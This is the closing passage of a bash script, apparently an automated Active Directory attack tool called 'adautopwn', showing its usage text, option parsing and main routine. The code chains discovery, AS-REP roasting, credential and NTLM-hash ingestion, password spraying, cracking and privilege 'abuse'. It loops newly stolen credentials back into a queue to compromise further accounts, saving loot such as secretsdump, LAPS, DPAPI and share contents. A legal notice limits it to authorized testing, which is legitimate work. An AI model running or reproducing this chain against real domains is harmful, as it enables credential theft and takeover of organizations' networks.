   ├─ asrep_hashes.txt · kerberoast_hashes.txt · secretsdump.txt · rollback.log
   ├─ enum/           users/groups/policy, nmap, domain wordlist
   ├─ secrets/        LAPS · gMSA · GPP · DPAPI · ACL dumps · trusts · ADCS · coercion
   ├─ shares/         looted share contents
   ├─ bloodhound/     collection .zip
   └─ raw/            misc intermediates

${C_YELLOW}${C_BOLD}⚠  LEGAL:${C_RESET} ${C_YELLOW}Use only against systems you are explicitly authorized to test
   (signed engagement, your own lab, or a CTF you're entitled to play).${C_RESET}
EOF
}

# ===========================================================================
#  ARGUMENT PARSING
# ===========================================================================
parse_args() {
    [[ $# -eq 0 ]] && { usage; exit 0; }
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t) DC_IP="$2"; shift 2;;
            -d) DOMAIN="$2"; shift 2;;
            -u) USER="$2"; shift 2;;
            -p) PASS="$2"; shift 2;;
            -H) HASH="$2"; shift 2;;
            -o) OUTDIR="$2"; shift 2;;
            -w) WORDLIST="$2"; shift 2;;
            --sudo-pass) SUDO_PASS="$2"; shift 2;;
            --creds-file) CREDS_FILE="$2"; shift 2;;
            --users-file) USERS_FILE="$2"; shift 2;;
            --spray) SPRAY_GEN=1; shift;;
            --crack) DO_CRACK=1; shift;;
            --no-crack) DO_CRACK=0; shift;;
            --abuse) DO_ABUSE=1; shift;;
            --cleanup) DO_CLEANUP=1; shift;;
            --graph) GRAPH_ZIP="$2"; shift 2;;
            --owned) OWNED_FILE="$2"; shift 2;;
            --no-open) NO_OPEN=1; shift;;
            --stealth) STEALTH=1; shift;;
            --ntlm) KERBEROS=0; shift;;
            --no-bh) DO_BLOODHOUND=0; shift;;
            -y|--yes) AUTO_YES=1; shift;;
            --no-color) NO_COLOR=1; shift;;
            -h|--help) usage; exit 0;;
            *) err "Unknown option: $1"; usage; exit 1;;
        esac
    done
    [[ -z "$DC_IP" && -z "$GRAPH_ZIP" ]] && { err "Missing -t <DC_IP>  (or --graph <bloodhound.zip>)"; exit 1; }
}

# ===========================================================================
#  MAIN
# ===========================================================================
main() {
    parse_args "$@"
    clear 2>/dev/null
    banner

    # Standalone graph mode: render a BloodHound zip → graph.html and exit
    if [[ -n "$GRAPH_ZIP" ]]; then
        [[ -n "$OUTDIR" ]] && { mkdir -p "$OUTDIR"; OUTDIR="$(cd "$OUTDIR" && pwd)"; }
        graph_only_mode
        exit 0
    fi

    # If launched from *inside* an existing loot dir (it has our log), reuse it
    # instead of nesting loot_/loot_. This makes a plain re-run resume cleanly.
    if [[ -z "$OUTDIR" && -f "./adautopwn.log" && "$(basename "$PWD")" == loot_* ]]; then
        OUTDIR="$PWD"
        warn "Detected an existing loot dir in CWD → reusing it (resume) instead of nesting"
    fi
    [[ -z "$OUTDIR" ]] && OUTDIR="loot_${DOMAIN:-$DC_IP}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTDIR"; OUTDIR="$(cd "$OUTDIR" && pwd)"
    LOGFILE="$OUTDIR/adautopwn.log"; : >"$LOGFILE"
    ROLLBACK_FILE="$OUTDIR/rollback.log"
    info "Loot and logs in: ${C_BOLD}$OUTDIR${C_RESET}"

    # Cleanup mode: revert tracked changes and exit
    if [[ "$DO_CLEANUP" == "1" ]]; then
        [[ ! -s "$ROLLBACK_FILE" ]] && warn "Tip: point -o at the original loot dir that holds rollback.log"
        run_cleanup
        exit 0
    fi

    check_deps
    request_sudo

    # --- One-time, unauthenticated groundwork ---
    phase_discovery
    gen_domain_wordlist          # build target-specific candidates once domain is known
    phase_hosts_time
    phase_unauth
    phase_asreproast

    # --- Self-feed: resume context + ingest anything the operator found manually ---
    # Resume recovered passwords if reusing an existing loot dir
    if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
        while IFS= read -r p; do [[ -n "$p" ]] && FOUND_SECRETS["$p"]=1; done <"$OUTDIR/found_passwords.txt"
        info "Resumed $(wc -l <"$OUTDIR/found_passwords.txt") previously recovered passwords"
    fi
    # Resume: don't re-pwn identities already compromised on this loot dir. Loading
    # them into SEEN_CREDS makes process_queue skip them, so re-running (e.g. with
    # --creds-file adding a new lead) continues the chain instead of redoing every
    # account we already owned.
    if [[ -s "$OUTDIR/owned_principals.txt" ]]; then
        local _ou _n=0
        while IFS=$'\t' read -r _ou _; do
            [[ -n "$_ou" ]] && { SEEN_CREDS["${_ou,,}"]=1; _n=$((_n+1)); }
        done <"$OUTDIR/owned_principals.txt"
        [[ "$_n" -gt 0 ]] && info "Resume: $_n already-owned identity/identities will be skipped (won't re-pwn)"
    fi
    # Merge an externally-supplied user list (for spray / AS-REP)
    if [[ -n "$USERS_FILE" && -s "$USERS_FILE" ]]; then
        cat "$USERS_FILE" "$OUTDIR/users_all.txt" 2>/dev/null | sort -u >"$OUTDIR/users_all.txt.tmp"
        mv "$OUTDIR/users_all.txt.tmp" "$OUTDIR/users_all.txt"
        ok "Merged $(wc -l <"$USERS_FILE") external users → users_all.txt"
    fi

    # --- Seed the queue: supplied credential + any creds file, then pivot ---
    # Inline cracking/looting inside each phase feeds newly recovered creds back
    # into the queue, so process_queue keeps draining until nothing new appears.
    [[ -n "$USER" ]] && queue_cred "$USER" "$PASS" "$HASH"
    if [[ -n "$CREDS_FILE" && -s "$CREDS_FILE" ]]; then
        info "Ingesting credentials from $CREDS_FILE"
        while IFS= read -r line; do
            [[ -z "$line" || "$line" == \#* ]] && continue
            local cu cs; cu="${line%%:*}"; cs="${line#*:}"
            [[ "$cu" == "$cs" ]] && cs=""        # line had no ':' separator
            if [[ "$cs" =~ ^[a-fA-F0-9]{32}$ ]]; then queue_cred "$cu" "" "$cs"
            else queue_cred "$cu" "$cs" ""; [[ -n "$cs" ]] && add_secret "$cs"; fi
        done <"$CREDS_FILE"
    fi
    process_queue

    final_summary
}

main "$@"
